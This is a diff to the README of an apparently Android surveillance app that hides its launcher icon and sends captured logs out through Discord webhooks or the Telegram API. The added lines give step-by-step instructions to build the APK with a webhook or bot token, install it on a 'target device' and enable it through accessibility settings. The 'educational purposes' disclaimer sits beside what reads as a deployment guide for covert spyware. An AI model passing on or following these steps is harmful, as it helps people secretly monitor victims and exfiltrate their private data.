@@ -10,6 +10,7 @@ This open-source project is intended for educational and research purposes only.
 * Legality: Installing or using this software on devices owned by third parties without their explicit consent is illegal and constitutes a violation of privacy laws.
 
 * Creator Disclaimer: The creator and contributors of this project are not liable for any misuse or unlawful actions conducted by users of this software.
+* Another Disclaimer: I have no idea what I'm doing here. 
 
 ## Features
 ✔️ full launcher stealth with no app icon on the home screen or launcher
@@ -29,7 +30,14 @@ This open-source project is intended for educational and research purposes only.
 ✔️ You can choose to send logs either through Discord webhooks or the Telegram API.
 
 ## Instalation
-
+__Using the builder__
+   * You're gonna need java installed to run this.
+   * Double click on run.bat
+   * Paste your discord webhook url or your telegram bot data
+   * Click on BUILD APK and then SIGN APK (if you want to sign it)
+   * Install on target device.
+   * You __must__ enable it in the accessibility settings.
+   
 1. __Telegram:__
     * Download APK file.
     * To decompile the APK, open it in an APK Editor like [APKToolGUI](https://github.com/AndnixSH/APKToolGUI) or [APK Editor Studio](https://github.com/kefir500/apk-editor-studio).
